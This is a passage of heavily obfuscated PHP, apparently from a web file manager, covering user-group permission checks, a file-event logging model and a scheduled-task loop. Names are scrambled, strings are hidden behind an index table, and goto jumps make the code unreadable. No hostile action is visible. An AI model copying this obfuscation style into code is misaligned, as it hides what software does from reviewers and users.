$c‹ä¦…ÍÈí; } if ($dÖÈ™·¶•› == $cà¯µ×±¾Ä && $C¥Ÿç¯‰‡Œ >= $eĞ±Ú¦¸¿İ) { $eĞ±Ú¦¸¿İ = $C¥Ÿç¯‰‡Œ; $C˜’Š›öèÇ = $EÚ«Í‘§óä; $f¯¥Å—¹½â = $c‹ä¦…ÍÈí; } } else { if ($c‹ä¦…ÍÈí == $EçóÚùŠ­[500]) { $C— å‰ÍºÈ = !0; $b«…•óâ“ = $EÚ«Í‘§óä; $fŠ†ö¡– = $C¥Ÿç¯‰‡Œ; } } } } if ($bä­÷„„ğ) { $dËèŸÂËğ = $dÀÔòœ¤; $EÚ«Í‘§óä = $E¬¨£§÷¿; $Eµé×¯–È™ = LNG($EçóÚùŠ­[1869]); } else { if ($f‡Šö›…º) { $dËèŸÂËğ = $eĞ±Ú¦¸¿İ; $EÚ«Í‘§óä = $C˜’Š›öèÇ; $eæìèò¸õÉ = Model($EçóÚùŠ­[489])->getInfo($f¯¥Å—¹½â); $Eµé×¯–È™ = $EçóÚùŠ­[169] . $eæìèò¸õÉ[$EçóÚùŠ­[494]] . $EçóÚùŠ­[1870] . LNG($EçóÚùŠ­[1871]); } else { if ($C— å‰ÍºÈ) { $dËèŸÂËğ = $fŠ†ö¡–; $EÚ«Í‘§óä = $b«…•óâ“; $Eµé×¯–È™ = LNG($EçóÚùŠ­[1842]); } else { $dËèŸÂËğ = 0; $EÚ«Í‘§óä = !1; $Eµé×¯–È™ = $EçóÚùŠ­[43]; } } } $f¡ò™¼Â” = array($EçóÚùŠ­[1861] => intval($dËèŸÂËğ), $EçóÚùŠ­[1845] => $EÚ«Í‘§óä, $EçóÚùŠ­[1862] => $Eµé×¯–È™, $EçóÚùŠ­[1854] => $bÔÚ”…‘†è[$EçóÚùŠ­[399]]); goto Eç—‚å‹Â; cµæ¸µ´Ğœ: $bä­÷„„ğ = 0; $dÀÔòœ¤ = 0; $E¬¨£§÷¿ = 0; goto e«˜œÛ­¬Õ; dšÓ‹±Õ¡Ñ: } private function groupContainUser($F¶Œ†ïÕ‡º, $A”Ô™²ö¶¥ = false) { return in_array($F¶Œ†ïÕ‡º, $this->userGroupParents($A”Ô™²ö¶¥)); } private function groupStepToUserGroup($aÊ›Öá¬–Ë, $c®¦­¸Üø  = false) { goto A„‰à¹ˆ¤Ú; A„‰à¹ˆ¤Ú: $AêáµŠ¢‰è =& $_SERVER[¾÷]; $cª¡º³Şó„ = $this->userGroupList($c®¦­¸Üø ); $BóÛŸá‘ÚŠ = 1000; goto Có”¿Ë‰ÛŞ; B†–è¨Œ„…: return $BóÛŸá‘ÚŠ; goto c¥¥•»¶‰; Có”¿Ë‰ÛŞ: $b‰¼Ã°¨ = $GLOBALS[$AêáµŠ¢‰è[16]][$AêáµŠ¢‰è[97]][$AêáµŠ¢‰è[1761]] == 1; $dÛÂß‹¹¦ = $b‰¼Ã°¨ ? 3 : 2; foreach ($cª¡º³Şó„ as $CÏ»áí¨·) { if ($CÏ»áí¨·[$AêáµŠ¢‰è[1668]] == $aÊ›Öá¬–Ë) { return 0; } $aÜ¬†¢³­ = explode($AêáµŠ¢‰è[57], trim($CÏ»áí¨·[$AêáµŠ¢‰è[490]], $AêáµŠ¢‰è[57])); if ($aÜ¬†¢³­[0] == $AêáµŠ¢‰è[500] && count($aÜ¬†¢³­) > $dÛÂß‹¹¦) { $F•×¬Éº‹ì = array_reverse(array_slice($aÜ¬†¢³­, $dÛÂß‹¹¦)); $d„ó·÷×Ü = array_search($aÊ›Öá¬–Ë, $F•×¬Éº‹ì); if ($d„ó·÷×Ü !== !1 && $d„ó·÷×Ü + 1 <= $BóÛŸá‘ÚŠ) { $BóÛŸá‘ÚŠ = $d„ó·÷×Ü + 1; } } } goto B†–è¨Œ„…; c¥¥•»¶‰: } private function userGroupList($B™åŒ¤ôóÒ = false) { $b³ö•«§ëß =& $_SERVER[¾÷]; static $C‚±À­ÌÑá = array(); if (isset($C‚±À­ÌÑá[$B™åŒ¤ôóÒ])) { return $C‚±À­ÌÑá[$B™åŒ¤ôóÒ]; } $E¢„å¨Æ = Model($b³ö•«§ëß[510])->getInfo($B™åŒ¤ôóÒ); $C‚±À­ÌÑá[$B™åŒ¤ôóÒ] = array_to_keyvalue($E¢„å¨Æ[$b³ö•«§ëß[1843]], $b³ö•«§ëß[1668]); return $C‚±À­ÌÑá[$B™åŒ¤ôóÒ]; } public function userGroupParents($D‹ï»è”Œ») { goto DåÈ·ğê; AêÊ¾ó²ÛË: $cè‚ÇˆÀ¨ó = $GLOBALS[$e›Ã†‡½ [16]][$e›Ã†‡½ [97]][$e›Ã†‡½ [1761]] == 1; $CÃ­Úí½ = $cè‚ÇˆÀ¨ó ? 3 : 2; foreach ($D±‚†Ÿ²À¥ as $bÖ¤µö­³“) { $dÑ”Š¶ëÄå = array($bÖ¤µö­³“[$e›Ã†‡½ [1668]]); $bæõ®”«ä = explode($e›Ã†‡½ [57], trim($bÖ¤µö­³“[$e›Ã†‡½ [490]], $e›Ã†‡½ [57])); if ($bæõ®”«ä[0] == $e›Ã†‡½ [500] && count($bæõ®”«ä) > $CÃ­Úí½) { $B‘ò¦õŸ«ê = array_slice($bæõ®”«ä, $CÃ­Úí½); $dÑ”Š¶ëÄå = array_merge($dÑ”Š¶ëÄå, array_reverse($B‘ò¦õŸ«ê)); } $Cá¸¶» = array_merge($Cá¸¶», $dÑ”Š¶ëÄå); } goto DÇÖ¸•ÄÀ´; DåÈ·ğê: $e›Ã†‡½  =& $_SERVER[¾÷]; static $fèÏÑÒˆ¿í = array(); $D‹ï»è”Œ» = $D‹ï»è”Œ» ? $D‹ï»è”Œ» : USER_ID; goto få’’ë„Ô×; DÇÖ¸•ÄÀ´: $fèÏÑÒˆ¿í[$D‹ï»è”Œ»] = array_unique($Cá¸¶»); return $fèÏÑÒˆ¿í[$D‹ï»è”Œ»]; goto eÃòÁ©Š™; få’’ë„Ô×: if (isset($fèÏÑÒˆ¿í[$D‹ï»è”Œ»])) { return $fèÏÑÒˆ¿í[$D‹ï»è”Œ»]; } $D±‚†Ÿ²À¥ = $this->userGroupList($D‹ï»è”Œ»); $Cá¸¶» = array(); goto AêÊ¾ó²ÛË; eÃòÁ©Š™: } public function authTargetInfoMake($eŒ™„¯ğ§) { goto cß¿œĞš®³; cß¿œĞš®³: $Bî¿Ä‘šÜ¶ =& $_SERVER[¾÷]; $Dƒê“´ñğ  = array(); $f¯ÔÄ¬ƒá“ = array(); goto A…¬ÊÀŸÁ¼; A…¬ÊÀŸÁ¼: foreach ($eŒ™„¯ğ§ as $Bí­Ûá¾¥é) { if ($Bí­Ûá¾¥é[$Bî¿Ä‘šÜ¶[407]] == SourceModel::TYPE_USER) { $Dƒê“´ñğ [] = intval($Bí­Ûá¾¥é[$Bî¿Ä‘šÜ¶[487]]); } else { if ($Bí­Ûá¾¥é[$Bî¿Ä‘šÜ¶[407]] == SourceModel::TYPE_GROUP) { $f¯ÔÄ¬ƒá“[] = intval($Bí­Ûá¾¥é[$Bî¿Ä‘šÜ¶[487]]); } } } if ($Dƒê“´ñğ ) { $Dƒê“´ñğ  = Model($Bî¿Ä‘šÜ¶[506])->userListInfo($Dƒê“´ñğ ); } if ($f¯ÔÄ¬ƒá“) { $Bõœ‹ÆŠ¬÷ = array($Bî¿Ä‘šÜ¶[1747] => array($Bî¿Ä‘šÜ¶[414], $f¯ÔÄ¬ƒá“)); $f¯ÔÄ¬ƒá“ = Model($Bî¿Ä‘šÜ¶[489])->field($Bî¿Ä‘šÜ¶[1872])->where($Bõœ‹ÆŠ¬÷)->select(); $f¯ÔÄ¬ƒá“ = array_to_keyvalue($f¯ÔÄ¬ƒá“, $Bî¿Ä‘šÜ¶[1668]); } goto b‰¸Ø»šçø; b‰¸Ø»šçø: return array($Bî¿Ä‘šÜ¶[1873] => $Dƒê“´ñğ , $Bî¿Ä‘šÜ¶[1874] => $f¯ÔÄ¬ƒá“); goto A®¨™‚’; A®¨™‚’: } public function authInfo($F‰¯™¢¾) { $eš›®Åù©¤ =& $_SERVER[¾÷]; if ($F‰¯™¢¾[$eš›®Åù©¤[1764]]) { $BïâèËÒŸ = Model($eš›®Åù©¤[1836])->listData($F‰¯™¢¾[$eš›®Åù©¤[1764]]); if (!$BïâèËÒŸ) { return !1; $D°‹‚ÉÁÜ = Model($eš›®Åù©¤[1836])->listData(); $d×–ÅØ±À = array_filter_by_field($D°‹‚ÉÁÜ, $eš›®Åù©¤[409], $eš›®Åù©¤[500]); return $d×–ÅØ±À; } $DäßÉÌğ’ = array_field_key($BïâèËÒŸ, array($eš›®Åù©¤[397], $eš›®Åù©¤[38], $eš›®Åù©¤[409], $eš›®Åù©¤[1689], $eš›®Åù©¤[1691])); $DäßÉÌğ’[$eš›®Åù©¤[1875]] = $F‰¯™¢¾; return $DäßÉÌğ’; } else { return array($eš›®Åù©¤[415] => 0, $eš›®Åù©¤[1674] => $F‰¯™¢¾[$eš›®Åù©¤[1818]], $eš›®Åù©¤[416] => $eš›®Åù©¤[43], $eš›®Åù©¤[1689] => $eš›®Åù©¤[1876]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\x72\x63\145\x5f\145\x76\x65\156\x74"; protected $dataAuto = array(array("\143\x72\145\141\x74\145\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\156\163\x65\162\x74", "\x66\165\x6e\x63\x74\x69\157\156"), array("\144\145\x73\143", '', "\151\x6e\x73\x65\x72\x74\54\165\x70\x64\141\164\x65\x2c\163\145\x6c\x65\x63\164", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($CŒÉšó¨Å , $BÀ…À‘ğÄ, $aññ™¾²Ê = '') { goto dˆÑÑ¡„Áâ; dˆÑÑ¡„Áâ: $Aº¯‹ˆ»ÈÛ =& $_SERVER[¾÷]; if (!$this->eventSave) { return; } $B‚¤Û¾–İ­ = Model($Aº¯‹ˆ»ÈÛ[1180])->sourceInfo($CŒÉšó¨Å ); goto Bì×Ÿê§; Bì×Ÿê§: if (!$B‚¤Û¾–İ­) { return !1; } if ($this->isCacheEvent($B‚¤Û¾–İ­, $BÀ…À‘ğÄ)) { return; } if ($aññ™¾²Ê && is_string($aññ™¾²Ê)) { $aññ™¾²Ê = array($Aº¯‹ˆ»ÈÛ[1701] => $aññ™¾²Ê); } goto fÒ÷±–½¯‹; fÒ÷±–½¯‹: $A±¡šá˜¾„ = array($Aº¯‹ˆ»ÈÛ[413] => $CŒÉšó¨Å , $Aº¯‹ˆ»ÈÛ[1877] => $B‚¤Û¾–İ­[$Aº¯‹ˆ»ÈÛ[481]], $Aº¯‹ˆ»ÈÛ[1878] => $B‚¤Û¾–İ­[$Aº¯‹ˆ»ÈÛ[38]], $Aº¯‹ˆ»ÈÛ[498] => $B‚¤Û¾–İ­[$Aº¯‹ˆ»ÈÛ[498]], $Aº¯‹ˆ»ÈÛ[1497] => USER_ID, $Aº¯‹ˆ»ÈÛ[418] => $BÀ…À‘ğÄ, $Aº¯‹ˆ»ÈÛ[1499] => $aññ™¾²Ê); $this->addSystemLog($BÀ…À‘ğÄ, $A±¡šá˜¾„); return $this->add($A±¡šá˜¾„); goto E‹§ŠÅ« Ú; E‹§ŠÅ« Ú: } private function addSystemLog($b‘Á‰µÓ¬, $d½È„ğ‹˜) { $a÷Ä§¿œå¬ =& $_SERVER[¾÷]; if ($b‘Á‰µÓ¬ == $a÷Ä§¿œå¬[1879]) { $b‘Á‰µÓ¬ = $d½È„ğ‹˜[$a÷Ä§¿œå¬[434]][$a÷Ä§¿œå¬[1880]]; } else { if (in_array($b‘Á‰µÓ¬, array($a÷Ä§¿œå¬[1645], $a÷Ä§¿œå¬[1881]))) { $b‘Á‰µÓ¬ = $d½È„ğ‹˜[$a÷Ä§¿œå¬[434]][$a÷Ä§¿œå¬[714]]; } } $C×©÷²³¨ = array_merge($d½È„ğ‹˜, array($a÷Ä§¿œå¬[1882] => $d½È„ğ‹˜[$a÷Ä§¿œå¬[399]], $a÷Ä§¿œå¬[1883] => $d½È„ğ‹˜[$a÷Ä§¿œå¬[1883]])); Model($a÷Ä§¿œå¬[1609])->addLog($a÷Ä§¿œå¬[1884] . $b‘Á‰µÓ¬, $C×©÷²³¨); } private function isCacheEvent($c²ôŒ×µµ, $eÇˆîÀ²¾ƒ) { if ($c²ôŒ×µµ[$_SERVER[¾÷][407]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($A¹»ˆµ½‡, $CÛî¤®±àë) { $C ³Ï¸Ûï =& $_SERVER[¾÷]; $B³§–Õ¡¬Ì = Model($C ³Ï¸Ûï[1180])->sourceInfo($A¹»ˆµ½‡); $DˆÃŸÚÖÌ½ = array($C ³Ï¸Ûï[1880] => $CÛî¤®±àë, $C ³Ï¸Ûï[38] => $B³§–Õ¡¬Ì[$C ³Ï¸Ûï[38]]); return $this->addEvent($A¹»ˆµ½‡, $C ³Ï¸Ûï[1879], $DˆÃŸÚÖÌ½); } public function eventFileEdit($fİÄ«Ş²•š) { $C‚’Œ´ğŸ¼ =& $_SERVER[¾÷]; $aîË¬íÌäö = array($C‚’Œ´ğŸ¼[1885] => $_SERVER[$C‚’Œ´ğŸ¼[1886]], $C‚’Œ´ğŸ¼[1887] => strtolower(ACTION)); return $this->addEvent($fİÄ«Ş²•š, $C‚’Œ´ğŸ¼[1635], $aîË¬íÌäö); } public function eventRecycle($A·§ÓÄê, $A ïçììä×) { return $this->addEvent($A·§ÓÄê, $_SERVER[¾÷][1881], $A ïçììä×); } public function eventRemove($F„ç´´ÒĞ) { $AšòâµÊš =& $_SERVER[¾÷]; $f­Ø¦§ƒ–Œ = Model($AšòâµÊš[1180])->sourceInfo($F„ç´´ÒĞ); $aƒ‰‡ÈÜÊ… = $f­Ø¦§ƒ–Œ[$AšòâµÊš[38]]; return $this->addEvent($f­Ø¦§ƒ–Œ[$AšòâµÊš[481]], $AšòâµÊš[1634], $aƒ‰‡ÈÜÊ…); } public function eventShare($A¶‚îÀ‚ÉÜ, $cÅÕ±ÒÎô˜) { return $this->addEvent($A¶‚îÀ‚ÉÜ, $_SERVER[¾÷][1645], $cÅÕ±ÒÎô˜); } public function eventMove($B‚ªÛ­¦áÑ, $cŞš§¢Å‹¼, $Aê¬ŒÙŠÖ) { goto c‡©‰¢èß‹; c‡©‰¢èß‹: $A¿áïê âİ =& $_SERVER[¾÷]; $dô¬®×±êÑ = Model($A¿áïê âİ[1180]); $b± ™ˆ¹° = $dô¬®×±êÑ->sourceInfo($B‚ªÛ­¦áÑ); goto A¿·àƒİƒİ; A¿·àƒİƒİ: $e–ìÈÂª–õ = $dô¬®×±êÑ->sourceInfo($cŞš§¢Å‹¼); $F§³‡¼‰ê = $dô¬®×±êÑ->sourceInfo($Aê¬ŒÙŠÖ); $e‘™•ãÊØ = array($A¿áïê âİ[1031] => $cŞš§¢Å‹¼, $A¿áïê âİ[1888] => $e–ìÈÂª–õ[$A¿áïê âİ[38]], $A¿áïê âİ[1868] => $e–ìÈÂª–õ[$A¿áïê âİ[498]], $A¿áïê âİ[1032] => $Aê¬ŒÙŠÖ, $A¿áïê âİ[1889] => $F§³‡¼‰ê[$A¿áïê âİ[38]], $A¿áïê âİ[1890] => $F§³‡¼‰ê[$A¿áïê âİ[498]]); goto f…â£¨Š†; f…â£¨Š†: $this->addEvent($B‚ªÛ­¦áÑ, $A¿áïê âİ[524], $e‘™•ãÊØ); $b± ™ˆ¹° = $dô¬®×±êÑ->sourceInfo($B‚ªÛ­¦áÑ); $e‘™•ãÊØ = array($A¿áïê âİ[399] => $b± ™ˆ¹°[$A¿áïê âİ[399]], $A¿áïê âİ[38] => $b± ™ˆ¹°[$A¿áïê âİ[38]]); goto CšäÚÖŒÂ; CšäÚÖŒÂ: $this->addEvent($cŞš§¢Å‹¼, $A¿áïê âİ[1891], $e‘™•ãÊØ); goto b¡‡ç—Ü¥Ö; b¡‡ç—Ü¥Ö: } public function eventCopy($aê†—«æåÃ) { $this->eventCreate($aê†—«æåÃ, $_SERVER[¾÷][522]); } public function eventRename($eˆ‘‡ÖÜ, $Fâ‡—ù, $E¹†Ù¼Éøº) { $Aë¿‡¼×“« =& $_SERVER[¾÷]; $eèÚ¡Î‘Î = array($Aë¿‡¼×“«[1031] => $Fâ‡—ù, $Aë¿‡¼×“«[1032] => $E¹†Ù¼Éøº); return $this->addEvent($eˆ‘‡ÖÜ, $Aë¿‡¼×“«[1195], $eèÚ¡Î‘Î); } public function eventAddComment($E‹ÓÅ—é°§, $dîËÎ´Æ®) { return $this->addEvent($E‹ÓÅ—é°§, $_SERVER[¾÷][1892], $dîËÎ´Æ®); } public function eventAddDesc($aÚ‹Âù÷Õ, $C¢¹­ò´ÍÒ) { return $this->addEvent($aÚ‹Âù÷Õ, $_SERVER[¾÷][1893], $C¢¹­ò´ÍÒ); } public function listBySource($b¡¨ëà‘Ò) { goto A«¾õ¥±Ğ£; A«¾õ¥±Ğ£: $f«™Ÿä’¦„ =& $_SERVER[¾÷]; $Fî—°Ç½ = Model($f«™Ÿä’¦„[1180])->sourceInfo($b¡¨ëà‘Ò); $d½ÔŠ¨ç¦Â = array($f«™Ÿä’¦„[413] => $b¡¨ëà‘Ò); goto bŸ­Œóâò; bŸ­Œóâò: if ($Fî—°Ç½[$f«™Ÿä’¦„[406]] == $f«™Ÿä’¦„[96]) { $F„ÔšİİŸâ = Model($f«™Ÿä’¦„[1180])->listSearchChildren($b¡¨ëà‘Ò, 20000); $F„ÔšİİŸâ[] = $b¡¨ëà‘Ò . $f«™Ÿä’¦„[382]; $d½ÔŠ¨ç¦Â = array($f«™Ÿä’¦„[399] => array($f«™Ÿä’¦„[17], $F„ÔšİİŸâ)); } $D»é“ùÅÇ = $this->where($d½ÔŠ¨ç¦Â)->order($f«™Ÿä’¦„[1894])->selectPage(); if ($D»é“ùÅÇ[$f«™Ÿä’¦„[371]][$f«™Ÿä’¦„[372]] == 0) { $D»é“ùÅÇ[$f«™Ÿä’¦„[371]][$f«™Ÿä’¦„[372]] = 1; $D»é“ùÅÇ[$f«™Ÿä’¦„[374]] = array(array($f«™Ÿä’¦„[413] => $b¡¨ëà‘Ò, $f«™Ÿä’¦„[1877] => $Fî—°Ç½[$f«™Ÿä’¦„[481]], $f«™Ÿä’¦„[1497] => $Fî—°Ç½[$f«™Ÿä’¦„[435]], $f«™Ÿä’¦„[418] => $f«™Ÿä’¦„[1895], $f«™Ÿä’¦„[419] => $Fî—°Ç½[$f«™Ÿä’¦„[202]], $f«™Ÿä’¦„[1499] => $f«™Ÿä’¦„[43])); } goto a²ÃÑ‘¤íŠ; a²ÃÑ‘¤íŠ: return $this->eventListParse($D»é“ùÅÇ, $b¡¨ëà‘Ò); goto DĞøÍ³…¥š; DĞøÍ³…¥š: } private function eventListParse($C‚£×ĞÄéæ, $DŸĞ±Ğë¸) { goto Aˆ³Ì›ßé; e¤›ŞÌ¨¸: $fÎ‡ä£…Ş¿ = array_unique($fÎ‡ä£…Ş¿); $c‘¿Ş°ö¹Ù = array_unique(array_to_keyvalue($e‡“©…•Î, $C‡–Ú§æÑ[43], $C‡–Ú§æÑ[1505])); $bõìâ’íªª = Model($C‡–Ú§æÑ[510])->userListInfo($c‘¿Ş°ö¹Ù); goto a®ª²ŒëöÁ; Aˆ³Ì›ßé: $C‡–Ú§æÑ =& $_SERVER[¾÷]; $e‡“©…•Î = $C‚£×ĞÄéæ[$C‡–Ú§æÑ[374]]; $fÎ‡ä£…Ş¿ = array_to_keyvalue($e‡“©…•Î, $C‡–Ú§æÑ[43], $C‡–Ú§æÑ[399]); goto cÙÛéö£¨–; a®ª²ŒëöÁ: $F£ô‹¿ÊøÛ = Model($C‡–Ú§æÑ[776])->sourceListInfo($fÎ‡ä£…Ş¿, !0); foreach ($e‡“©…•Î as &$Dã«Âµ‘Ã) { if ($Dã«Âµ‘Ã[$C‡–Ú§æÑ[39]] == $C‡–Ú§æÑ[524] && isset($Dã«Âµ‘Ã[$C‡–Ú§æÑ[434]][$C‡–Ú§æÑ[1031]])) { $Dã«Âµ‘Ã[$C‡–Ú§æÑ[434]][$C‡–Ú§æÑ[1031]] = $F£ô‹¿ÊøÛ[$Dã«Âµ‘Ã[$C‡–Ú§æÑ[434]][$C‡–Ú§æÑ[1031]]]; $Dã«Âµ‘Ã[$C‡–Ú§æÑ[434]][$C‡–Ú§æÑ[1032]] = $F£ô‹¿ÊøÛ[$Dã«Âµ‘Ã[$C‡–Ú§æÑ[434]][$C‡–Ú§æÑ[1032]]]; } if ($Dã«Âµ‘Ã[$C‡–Ú§æÑ[39]] == $C‡–Ú§æÑ[1891] && isset($Dã«Âµ‘Ã[$C‡–Ú§æÑ[434]][$C‡–Ú§æÑ[399]])) { $Dã«Âµ‘Ã[$C‡–Ú§æÑ[434]][$C‡–Ú§æÑ[399]] = $F£ô‹¿ÊøÛ[$Dã«Âµ‘Ã[$C‡–Ú§æÑ[434]][$C‡–Ú§æÑ[399]]]; } $Dã«Âµ‘Ã[$C‡–Ú§æÑ[94]] = $F£ô‹¿ÊøÛ[$Dã«Âµ‘Ã[$C‡–Ú§æÑ[399]]]; $Dã«Âµ‘Ã[$C‡–Ú§æÑ[1896]] = $F£ô‹¿ÊøÛ[$Dã«Âµ‘Ã[$C‡–Ú§æÑ[1883]]]; if ($Dã«Âµ‘Ã[$C‡–Ú§æÑ[39]] == $C‡–Ú§æÑ[1634]) { $Dã«Âµ‘Ã[$C‡–Ú§æÑ[1896]] = $Dã«Âµ‘Ã[$C‡–Ú§æÑ[94]]; $Dã«Âµ‘Ã[$C‡–Ú§æÑ[1883]] = $Dã«Âµ‘Ã[$C‡–Ú§æÑ[1896]][$C‡–Ú§æÑ[399]]; $Dã«Âµ‘Ã[$C‡–Ú§æÑ[94]] = !1; $Dã«Âµ‘Ã[$C‡–Ú§æÑ[399]] = $C‡–Ú§æÑ[43]; } $Dã«Âµ‘Ã[$C‡–Ú§æÑ[1826]] = $bõìâ’íªª[$Dã«Âµ‘Ã[$C‡–Ú§æÑ[1505]]]; } unset($Dã«Âµ‘Ã); goto c¡ºƒŒÇĞç; cÙÛéö£¨–: $Aä¶Ø‘â ì = array_to_keyvalue($e‡“©…•Î, $C‡–Ú§æÑ[43], $C‡–Ú§æÑ[1883]); foreach ($e‡“©…•Î as $Dã«Âµ‘Ã) { $AêÛšò‹Ü† = $Dã«Âµ‘Ã[$C‡–Ú§æÑ[434]]; if ($Dã«Âµ‘Ã[$C‡–Ú§æÑ[39]] == $C‡–Ú§æÑ[524] && isset($AêÛšò‹Ü†[$C‡–Ú§æÑ[1031]])) { $fÎ‡ä£…Ş¿[] = $AêÛšò‹Ü†[$C‡–Ú§æÑ[1031]] . $C‡–Ú§æÑ[43]; $fÎ‡ä£…Ş¿[] = $AêÛšò‹Ü†[$C‡–Ú§æÑ[1032]] . $C‡–Ú§æÑ[43]; } if ($Dã«Âµ‘Ã[$C‡–Ú§æÑ[39]] == $C‡–Ú§æÑ[1891] && isset($AêÛšò‹Ü†[$C‡–Ú§æÑ[399]])) { $fÎ‡ä£…Ş¿[] = $AêÛšò‹Ü†[$C‡–Ú§æÑ[399]] . $C‡–Ú§æÑ[43]; } } $fÎ‡ä£…Ş¿ = array_merge($fÎ‡ä£…Ş¿, $Aä¶Ø‘â ì, array($DŸĞ±Ğë¸ . $C‡–Ú§æÑ[43])); goto e¤›ŞÌ¨¸; c¡ºƒŒÇĞç: $C‚£×ĞÄéæ[$C‡–Ú§æÑ[374]] = $e‡“©…•Î; return $C‚£×ĞÄéæ; goto eë³¡Éø—¯; eë³¡Éø—¯: } public function removeBySource($B›†è¾ù) { $cùİÁ†— = array($_SERVER[¾÷][413] => $B›†è¾ù); $this->where($cùİÁ†—)->remove(); } } goto C¸ÎÙ Úó§; b­À®ò‰ù: class AutoTask { public static function start() { goto Eõ›Ó†òç¦; c¾¼¸’ÚˆÀ: while (!0) { self::cacheClear(); if (self::valueGet($AØ‡Ìó¡‹É[711]) != $AØ‡Ìó¡‹É[96]) { self::valueSet($AØ‡Ìó¡‹É[1468], $AØ‡Ìó¡‹É[500]); self::log($AØ‡Ìó¡‹É[1472]); die; } self::valueSet($AØ‡Ìó¡‹É[1468], $AØ‡Ìó¡‹É[96]); self::valueSet($AØ‡Ìó¡‹É[1469], time()); self::taskRunAll(); sleep(self::valueGet($AØ‡Ìó¡‹É[1473])); } goto F¯‹ŸäË¹; Eõ›Ó†òç¦: $AØ‡Ìó¡‹É =& $_SERVER[¾÷]; if (self::valueGet($AØ‡Ìó¡‹É[711]) != $AØ‡Ìó¡‹É[96]) { return; } if (self::valueGet($AØ‡Ìó¡‹É[1468]) == $AØ‡Ìó¡‹É[96]) { $e‰ß‚ÆŞ = self::valueGet($AØ‡Ìó¡‹É[1469]); if (time() - $e‰ß‚ÆŞ > 3600 * 2) { self::restart(); } return; } goto AÂ©ŠëÖĞ°; AÂ©ŠëÖĞ°: http_close(); self::valueSet($AØ‡Ìó¡‹É[1468], $AØ‡Ìó¡‹É[96]); Hook::bind($AØ‡Ìó¡‹É[1470], $AØ‡Ìó¡‹É[1471]); goto c¾¼¸’ÚˆÀ; F¯‹ŸäË¹: } public static function restart() { $b¢¿ÚÈ‚´È =& $_SERVER[¾÷]; http_close(); self::valueSet($b¢¿ÚÈ‚´È[711], $b¢¿ÚÈ‚´È[500]); sleep(self::valueGet($b¢¿ÚÈ‚´È[1473]) + 5); self::valueSet($b¢¿ÚÈ‚´È[1468], $b¢¿ÚÈ‚´È[500]); self::valueSet($b¢¿ÚÈ‚´È[711], $b¢¿ÚÈ‚´È[96]); } public static function shutdownEvent() { $a™Ü¢ô«Ïì =& $_SERVER[¾÷]; self::valueSet($a™Ü¢ô«Ïì[1468], $a™Ü¢ô«Ïì[500]); self::log($a™Ü¢ô«Ïì[1474]); } public static function config($EŸÉƒöòÔ, $F«Øáâ¯©) { $AŸÓäŞ¹•İ =& $_SERVER[¾÷]; $a‹£Ûø³Ù = 10; $F«Øáâ¯© = intval($F«Øáâ¯©) <= $a‹£Ûø³Ù ? $a‹£Ûø³Ù : intval($F«Øáâ¯©); self::valueSet($AŸÓäŞ¹•İ[711], $EŸÉƒöòÔ); self::valueSet($AŸÓäŞ¹•İ[1473], $F«Øáâ¯©); } private static function taskRunAll() { goto BµŠò­ˆÃ; E¢ÛİªÕÉ: $AÒ‘†ëŸ£ = count($DğØ‚‚‡); for ($a‹´îÔììÂ = 0; $a‹´îÔììÂ < $AÒ‘†ëŸ£; $a‹´îÔììÂ++) { $Fœá‚Í¢ = $DğØ‚‚‡[$a‹´îÔììÂ]; if (!$Fœá‚Í¢[$A³›ØÚ¨°œ[397]] || $Fœá‚Í¢[$A³›ØÚ¨°œ[1476]] != $A³›ØÚ¨°œ[96]) { continue; } if (!self::taskTimeCheck($Fœá‚Í¢)) { continue; } self::taskRun($Fœá‚Í¢); } Hook::trigger($A³›ØÚ¨°œ[1477]); goto FÒì¯³Õã; FÒì¯³Õã: self::taskQueueRun($B… çŒŒ§ë); self::closeDatabase(); goto A‹‚øÛ¢â; BµŠò­ˆÃ: $A³›ØÚ¨°œ =& $_SERVER[¾÷]; $B… çŒŒ§ë = timeFloat(); $DğØ‚‚‡ = Model($A³›ØÚ¨°œ[1475])->listData(); goto E¢ÛİªÕÉ; A‹‚øÛ¢â: } private static function taskQueueRun($C²ÛéïÛõç) { $bŒ¨¯Šô¼ø = 10; while (!0) { $B ›²ğÏ£ = TaskQueue::run(); if ($B ›²ğÏ£ === !1) { break; } if (timeFloat() - $C²ÛéïÛõç >= $bŒ¨¯Šô¼ø) { break; } } } private static function taskTimeCheck($a¹ºĞ²ù‚®) { goto aĞˆá‡†Í¶; BâëöÕŒ°Î: switch ($e¤©½ß°¸‹[$a®Öäè†Äó[39]]) { case $a®Öäè†Äó[1484]: if (time() - $Eø±çÆàå† < 3600 * 24 * 30) { return !1; } if ($e¤©½ß°¸‹[$a®Öäè†Äó[1484]] == date($a®Öäè†Äó[1485]) && $A×ßˆÚ…‚) { return !0; } break; case $a®Öäè†Äó[1486]: if (time() - $Eø±çÆàå† < 3600 * 24 * 7) { return !1; } $BÜº„ŞÊƒÒ = date($a®Öäè†Äó[1487]) == 0 ? 7 : date($a®Öäè†Äó[1487]); if ($e¤©½ß°¸‹[$a®Öäè†Äó[1486]] == $BÜº„ŞÊƒÒ && $A×ßˆÚ…‚) { return !0; } break; case $a®Öäè†Äó[1479]: if (time() - $Eø±çÆàå† < 3600 * 24) { return !1; } if ($A×ßˆÚ…‚) { return !0; } break; case $a®Öäè†Äó[1488]: if (time() - $Eø±çÆàå† >= floatval($e¤©½ß°¸‹[$a®Öäè†Äó[1488]]) * 60) { return !0; } break; default: break; } return !1; goto d‹„æ·ğ‚£; aĞˆá‡†Í¶: $a®Öäè†Äó =& $_SERVER[¾÷]; $e¤©½ß°¸‹ = json_decode($a¹ºĞ²ù‚®[$a®Öäè†Äó[205]], !0); $Eø±çÆàå† = intval($a¹ºĞ²ù‚®[$a®Öäè†Äó[1469]]); goto AŸ´Ö†ˆĞ„; AŸ´Ö†ˆĞ„: $A˜—“ğ¼áî = strtotime($a®Öäè†Äó[1478] . $e¤©½ß°¸‹[$a®Öäè†Äó[1479]] . $a®Öäè†Äó[1480]) - strtotime($a®Öäè†Äó[1481]); $c®ß’†¼ = time() - strtotime(date($a®Öäè†Äó[1482]) . $a®Öäè†Äó[1483]); $A×ßˆÚ…‚ = $c®ß’†¼ >= $A˜—“ğ¼áî && $c®ß’†¼ <= $A˜—“ğ¼áî + 3600; goto BâëöÕŒ°Î; 